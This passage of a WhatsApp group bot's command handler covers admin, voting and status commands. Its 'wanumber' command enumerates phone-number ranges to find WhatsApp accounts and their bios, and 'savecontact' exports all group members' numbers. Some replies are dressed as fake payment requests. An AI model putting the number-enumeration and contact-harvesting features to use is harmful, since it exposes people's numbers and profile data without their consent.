            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            adminevent = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "groupevent":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            groupevent = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            groupevent = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "invite":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!text)
            return replyLinkGc(
              `Enter the number you want to invite to the group\n\nExample :\n*${
                prefix + command
              }* 6281359391296`
            );
          if (text.includes("+"))
            return replyLinkGc(`Enter the number together without *+*`);
          if (isNaN(text))
            return replyLinkGc(
              `Enter only the numbers plus your country code without spaces`
            );
          let group = m.chat;
          let link =
            "https://chat.whatsapp.com/" +
            (await OctopusBotzz.groupInviteCode(group));
          await OctopusBotzz.sendMessage(text + "@s.whatsapp.net", {
            text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`,
            mentions: [m.sender],
          });
          replyLinkGc(` An invite link is sent to the user`);
        }
        break;
      case "closetime":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return replyLinkGc(
            "*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
          );
        }
        replyLinkGc(`Close time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const close = `*Close time* group closed by admin\nnow only admin can send messages`;
          OctopusBotzz.groupSettingUpdate(m.chat, "announcement");
          replyLinkGc(close);
        }, timer);
        break;
      case "opentime":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isCreator) return replyLinkGc(mess.admin);
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return replyLinkGc(
            "*select:*\nsecond\nminute\nhour\n\n*example*\n10 second"
          );
        }
        replyLinkGc(`Open time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const open = `*Open time* the group was opened by admin\n now members can send messages`;
          OctopusBotzz.groupSettingUpdate(m.chat, "not_announcement");
          replyLinkGc(open);
        }, timer);
        break;
      case "kick":
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let blockwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await OctopusBotzz.groupParticipantsUpdate(
          m.chat,
          [blockwww],
          "remove"
        );
        replyLinkGc(mess.done);
        break;
      case "idgroup":
      case "groupid":
        {
          if (!isCreator) return XeonStickOwner();
          let getGroups = await OctopusBotzz.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`;
          for (let x of anu) {
            let metadata2 = await OctopusBotzz.groupMetadata(x);
            teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`;
          }
          replyLinkGc(
            teks +
              `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`
          );
        }
        break;
      case "wanumber":
      case "nowa":
      case "searchno":
      case "searchnumber":
        {
          if (!text)
            return replyLinkGc(
              `Provide Number with last number x\n\nExample: ${
                prefix + command
              } 91690913721x`
            );
          var inputnumber = text.split(" ")[0];

          replyLinkGc(`Searching for WhatsApp account in given range...`);
          function countInstances(string, word) {
            return string.split(word).length - 1;
          }
          var number0 = inputnumber.split("x")[0];
          var number1 = inputnumber.split("x")[countInstances(inputnumber, "x")]
            ? inputnumber.split("x")[countInstances(inputnumber, "x")]
            : "";
          var random_length = countInstances(inputnumber, "x");
          var randomxx;
          if (random_length == 1) {
            randomxx = 10;
          } else if (random_length == 2) {
            randomxx = 100;
          } else if (random_length == 3) {
            randomxx = 1000;
          }
          var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`;
          var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`;
          var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`;
          for (let i = 0; i < randomxx; i++) {
            var nu = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
            var status1 = nu[Math.floor(Math.random() * nu.length)];
            var status2 = nu[Math.floor(Math.random() * nu.length)];
            var status3 = nu[Math.floor(Math.random() * nu.length)];
            var dom4 = nu[Math.floor(Math.random() * nu.length)];
            var random21;
            if (random_length == 1) {
              random21 = `${status1}`;
            } else if (random_length == 2) {
              random21 = `${status1}${status2}`;
            } else if (random_length == 3) {
              random21 = `${status1}${status2}${status3}`;
            } else if (random_length == 4) {
              random21 = `${status1}${status2}${status3}${dom4}`;
            }
            var anu = await OctopusBotzz.onWhatsApp(
              `${number0}${i}${number1}@s.whatsapp.net`
            );
            var anuu = anu.length !== 0 ? anu : false;
            try {
              try {
                var anu1 = await OctopusBotzz.fetchStatus(anu[0].jid);
              } catch {
                var anu1 = "401";
              }
              if (anu1 == "401" || anu1.status.length == 0) {
                nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`;
              } else {
                text66 += `🪀 *Number:* wa.me/${
                  anu[0].jid.split("@")[0]
                }\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(
                  anu1.setAt
                )
                  .tz("Asia/Jakarta")
                  .format("HH:mm:ss DD/MM/YYYY")}\n\n`;
              }
            } catch {
              nowhatsapp += `${number0}${i}${number1}\n`;
            }
          }
          replyLinkGc(`${text66}${nobio}${nowhatsapp}`);
        }
        break;
      case "getcontact":
      case "getcon":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || isCreator)) return XeonStickAdmin();
          xeonbigpp = await OctopusBotzz.sendMessage(
            m.chat,
            {
              text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`,
            },
            { quoted: m, ephemeralExpiration: 86400 }
          );

          OctopusBotzz.sendContact(
            m.chat,
            participants.map((a) => a.id),
            xeonbigpp
          );
        }
        break;
      case "savecontact":
      case "svcontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || isCreator)) return XeonStickAdmin();
          let cmiggc = await OctopusBotzz.groupMetadata(m.chat);
          let orgiggc = participants.map((a) => a.id);
          vcard = "";
          noPort = 0;
          for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${
              a.id.split("@")[0]
            }\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${
              a.id.split("@")[0]
            }\nEND:VCARD\n`;
          }
          let nmfilect = "./contacts.vcf";
          replyLinkGc(
            "\nBe patient bro, saving... " +
              cmiggc.participants.length +
              " contact"
          );
          require("fs").writeFileSync(nmfilect, vcard.trim());

          OctopusBotzz.sendMessage(
            m.chat,
            {
              document: require("fs").readFileSync(nmfilect),
              mimetype: "text/vcard",
              fileName: "Contact.vcf",
              caption:
                "\nSucceed\nGroup: *" +
                cmiggc.subject +
                "*\nContact: *" +
                cmiggc.participants.length +
                "*",
            },
            { ephemeralExpiration: 86400, quoted: m }
          );
          require("fs").unlinkSync(nmfilect);
        }
        break;
      case "sendcontact":
      case "sencontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!m.mentionedJid[0])
            return replyLinkGc(
              "\nUse like this\n Example:.sendcontact @tag|name"
            );
          let snTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let snContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: snTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  snTak +
                  ";;;\nFN:" +
                  snTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          OctopusBotzz.sendMessage(
            m.chat,
            { contacts: snContact },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "contacttag":
      case "contag":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(isGroupAdmins || isCreator)) return XeonStickAdmin();
          if (!m.mentionedJid[0])
            return replyLinkGc(
              "\nUse like this\n Example:.contacttag @tag|name"
            );
          let sngTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let sngContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: sngTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  sngTak +
                  ";;;\nFN:" +
                  sngTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          OctopusBotzz.sendMessage(
            m.chat,
            {
              contacts: sngContact,
              mentions: participants.map((a) => a.id),
            },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
      case "add":
        if (!m.isGroup) return XeonStickGroup();
        if (!isCreator) return XeonStickOwner();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let blockwwww = m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await OctopusBotzz.groupParticipantsUpdate(m.chat, [blockwwww], "add");
        replyLinkGc(mess.done);
        break;
      case "promote":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await OctopusBotzz.groupParticipantsUpdate(
          m.chat,
          [blockwwwww],
          "promote"
        );
        replyLinkGc(mess.done);
        break;
      case "demote":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let blockwwwwwa = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await OctopusBotzz.groupParticipantsUpdate(
          m.chat,
          [blockwwwwwa],
          "demote"
        );
        replyLinkGc(mess.done);
        break;
      case "setnamegc":
      case "setsubject":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (!text) return replyLinkGc("Text ?");
        await OctopusBotzz.groupUpdateSubject(m.chat, text);
        replyLinkGc(mess.done);
        break;
      case "userjid":
        {
          if (!isCreator) return XeonStickOwner();
          const groupMetadata = m.isGroup
            ? await OctopusBotzz.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`;
          for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`;
          }
          replyLinkGc(textt);
        }
        break;
      case "creategc":
      case "creategroup":
        {
          if (!isCreator) return XeonStickOwner();
          if (!args.join(" "))
            return replyLinkGc(`Use ${prefix + command} groupname`);
          try {
            let cret = await OctopusBotzz.groupCreate(args.join(" "), []);
            let response = await OctopusBotzz.groupInviteCode(cret.id);
            const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000)
              .tz("Asia/Jakarta")
              .format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`;
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: teksop,
                mentions: await OctopusBotzz.parseMention(teksop),
              },
              { quoted: m }
            );
          } catch {
            replyLinkGc(`Error`);
          }
        }
        break;
      case "setbotbio":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(
              `Where is the text?\nExample: ${prefix + command} Cheems Bot`
            );
          await OctopusBotzz.updateProfileStatus(text);
          replyLinkGc(`Success in changing the bio of bot's number`);
        }
        break;
      case "deleteppgroup":
      case "delppgc":
      case "deleteppgc":
      case "delppgroup":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (!isBotAdmins) return XeonStickBotAdmin();
          await OctopusBotzz.removeProfilePicture(from);
        }
        break;
      case "deleteppbot":
      case "delppbot":
        {
          if (!isCreator) return XeonStickOwner();
          await OctopusBotzz.removeProfilePicture(OctopusBotzz.user.id);
          replyLinkGc(`Success in deleting bot's profile picture`);
        }
        break;
      case "setdesc":
      case "setdesk":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (!text) return replyLinkGc("Text ?");
        await OctopusBotzz.groupUpdateDescription(m.chat, text);
        replyLinkGc(mess.done);
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
      case "setgrouppp":
      case "setgruppp":
      case "setgcpp":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins) return replyLinkGc(mess.admin);
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (!quoted)
          return replyLinkGc(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        if (!/image/.test(mime))
          return replyLinkGc(
            `Send/Reply Image Caption Caption ${prefix + command}`
          );
        if (/webp/.test(mime))
          return replyLinkGc(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        var medis = await OctopusBotzz.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await OctopusBotzz.query({
            tag: "iq",
            attrs: {
              to: m.chat,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          replyLinkGc(mess.done);
        } else {
          var memeg = await OctopusBotzz.updateProfilePicture(m.chat, {
            url: medis,
          });
          fs.unlinkSync(medis);
          replyLinkGc(mess.done);
        }
        break;
      case "tagall":
      case "tag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let me = m.sender;
        let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${
          me.split("@")[0]
        }\n🌿 *Message : ${q ? q : "no message"}*\n\n`;
        for (let mem of participants) {
          teks += `${themeemoji} @${mem.id.split("@")[0]}\n`;
        }
        OctopusBotzz.sendMessage(
          m.chat,
          {
            text: teks,
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "hidetag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        OctopusBotzz.sendMessage(
          m.chat,
          {
            text: q ? q : "",
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "totag":
        if (!m.isGroup) return XeonStickGroup();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (!isAdmins) return replyLinkGc(mess.admin);
        if (!m.quoted)
          return replyLinkGc(`Reply media with caption ${prefix + command}`);
        OctopusBotzz.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
        break;
      case "group":
      case "grup":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (args[0] === "close") {
          await OctopusBotzz.groupSettingUpdate(m.chat, "announcement").then(
            (res) => replyLinkGc(`Success Closing Group`)
          );
        } else if (args[0] === "open") {
          await OctopusBotzz.groupSettingUpdate(
            m.chat,
            "not_announcement"
          ).then((res) => replyLinkGc(`Success Opening Group`));
        } else {
          replyLinkGc(
            `Mode ${command}\n\n\nKetik ${prefix + command}open/close`
          );
        }
        break;
      case "editinfo":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (args[0] === "open") {
          await OctopusBotzz.groupSettingUpdate(m.chat, "unlocked").then(
            (res) => replyLinkGc(`Successfully Opened Edit Group Info`)
          );
        } else if (args[0] === "close") {
          await OctopusBotzz.groupSettingUpdate(m.chat, "locked").then((res) =>
            replyLinkGc(`Successfully Closed Edit Group Info`)
          );
        } else {
          replyLinkGc(`Mode ${command}\n\n\nType ${prefix + command}on/off`);
        }
        break;
      case "linkgroup":
      case "linkgrup":
      case "linkgc":
      case "gclink":
      case "grouplink":
      case "gruplink":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        let response = await OctopusBotzz.groupInviteCode(m.chat);
        OctopusBotzz.sendText(
          m.chat,
          `👥 *GROUP LINK*\n📛 *Name :* ${
            groupMetadata.subject
          }\n👤 *Owner Grup :* ${
            groupMetadata.owner !== undefined
              ? "+" + groupMetadata.owner.split`@`[0]
              : "Not known"
          }\n🌱 *ID :* ${
            groupMetadata.id
          }\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${
            groupMetadata.participants.length
          }\n`,
          m,
          {
            detectLink: true,
          }
        );
        break;
      case "getbio":
        {
          try {
            let who;
            if (m.isGroup)
              who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
            else who = m.quoted.sender ? m.quoted.sender : m.sender;
            let bio = await OctopusBotzz.fetchStatus(who);
            replyLinkGc(bio.status);
          } catch {
            if (text)
              return replyLinkGc(
                `bio is private or you haven't replied to the person's message!`
              );
            else
              try {
                let who = m.quoted ? m.quoted.sender : m.sender;
                let bio = await OctopusBotzz.fetchStatus(who);
                replyLinkGc(bio.status);
              } catch {
                return replyLinkGc(
                  `bio is private or you haven't replied to the person's message!`
                );
              }
          }
        }
        break;
        break;
      case "vote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (m.chat in vote)
            return replyLinkGc(
              `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            );
          if (!text)
            return replyLinkGc(
              `Enter Reason for Vote, Example: *${
                prefix + command
              } Handsome Owner*`
            );
          replyLinkGc(
            `Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`
          );
          vote[m.chat] = [q, [], []];

          upvote = vote[m.chat][1];
          devote = vote[m.chat][2];
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          OctopusBotzz.sendMessage(m.chat, { text: teks_vote }, { quoted: m });
        }
        break;
      case "upvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replyLinkGc(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
          wasVote = isVote.includes(m.sender);
          if (wasVote) return replyLinkGc("You have Voted");
          vote[m.chat][1].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          OctopusBotzz.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;
      case "downvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replyLinkGc(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
          wasVote = isVote.includes(m.sender);
          if (wasVote) return replyLinkGc("You have Voted");
          vote[m.chat][2].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          OctopusBotzz.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;

      case "checkvote":
        if (!m.isGroup) return XeonStickGroup();
        if (!(m.chat in vote))
          return replyLinkGc(
            `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
          );
        teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

*${prefix}deletevote* - to delete votes


©${OctopusBotzz.user.id}
`;
        OctopusBotzz.sendTextWithMentions(m.chat, teks_vote, m);
        break;
      case "deletevote":
      case "delvote":
      case "hapusvote":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!(m.chat in vote))
            return replyLinkGc(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          delete vote[m.chat];
          replyLinkGc("Successfully Deleted Vote Session In This Group");
        }
        break;
        break;
      case "revoke":
      case "resetlink":
        if (!m.isGroup) return XeonStickGroup();
        if (!isAdmins && !isGroupOwner && !isCreator) return XeonStickAdmin();
        if (!isBotAdmins) return XeonStickBotAdmin();
        await OctopusBotzz.groupRevokeInvite(m.chat).then((res) => {
          replyLinkGc(`Reset Success`);
        });
        break;
      //bot status
      case "ping":
      case "botstatus":
      case "statusbot":
      case "p":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          OctopusBotzz.relayMessage(
            m.chat,
            {
              requestPaymentMessage: {
                currencyCodeIso4217: "INR",
                amount1000: 999999999,
                requestFrom: m.sender,
                noteMessage: {
                  extendedTextMessage: {
                    text: respon,
                    contextInfo: {
                      externalAdReply: {
                        showAdAttribution: true,
                      },
                    },
                  },
                },
              },
            },
            {}
          );
        }

        break;
      case "repo":
      case "repository":
        {
          try {
            const [, username, repoName] = botscript.match(
              /github\.com\/([^/]+)\/([^/]+)/
            );
            const response = await axios.get(
              `https://api.github.com/repos/${username}/${repoName}`
            );
            if (response.status === 200) {
              const repoData = response.data;
              const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim();
              await OctopusBotzz.relayMessage(
                m.chat,
                {
                  requestPaymentMessage: {
                    currencyCodeIso4217: "INR",
                    amount1000: 69000,
                    requestFrom: m.sender,
                    noteMessage: {
                      extendedTextMessage: {
                        text: formattedInfo,
                        contextInfo: {
                          externalAdReply: {
                            showAdAttribution: true,
                          },
                        },
                      },
                    },
                  },
                },
                {}
              );
            } else {
              await replyLinkGc(`Unable to fetch repository information`);
            }
          } catch (error) {
            console.error(error);
            await replyLinkGc(`Repository currently not available `);
          }
        }
        break;
      case "buypremium":
      case "premiumuser":
        {
          let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`;
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              text: teks,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  title: botname,
                  body: ownername,
                  thumbnail: fs.readFileSync(
                    "./OctopusBotzzMedia/theme/oct.jpg"
                  ),
                  sourceUrl: wagc,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "rentbot":
        replyLinkGc(`Type ${prefix}owner and chat him`);
        break;
      case "speedtest":
        {
          replyLinkGc("Testing Speed...");
          let cp = require("child_process");
          let { promisify } = require("util");
          let exec = promisify(cp.exec).bind(cp);
          let o;
          try {
            o = await exec("python speed.py");
          } catch (e) {
            o = e;
          } finally {
            let { stdout, stderr } = o;
            if (stdout.trim())
              OctopusBotzz.sendMessage(
                m.chat,
                {
                  text: stdout,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true,
                      title: botname,
                      body: ownername,
                      thumbnail: fs.readFileSync(
                        "./OctopusBotzzMedia/theme/oct.jpg"
                      ),
                      sourceUrl: wagc,
                      mediaType: 1,
                      renderLargerThumbnail: true,
                    },
                  },
                },
                {
                  quoted: m,
                }
              );
            if (stderr.trim())
              OctopusBotzz.sendMessage(
                m.chat,
                {
                  text: stderr,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true,
                      title: botname,
                      body: ownername,
                      thumbnail: fs.readFileSync(
                        "./OctopusBotzzMedia/theme/oct.jpg"
                      ),
                      sourceUrl: wagc,
                      mediaType: 1,
                      renderLargerThumbnail: true,
                    },
                  },
                },
                {
                  quoted: m,
                }
              );
          }
        }
        break;
      case "runtime":
        let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`;
        OctopusBotzz.sendMessage(
          m.chat,
          {
            text: pinga,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          {
            quoted: m,
          }
        );
        break;
      case "owner":
        {
          OctopusBotzz.sendMessage(
            from,
            {
              contacts: {
                displayName: `${list.length} Contact`,
                contacts: list,
              },
            },
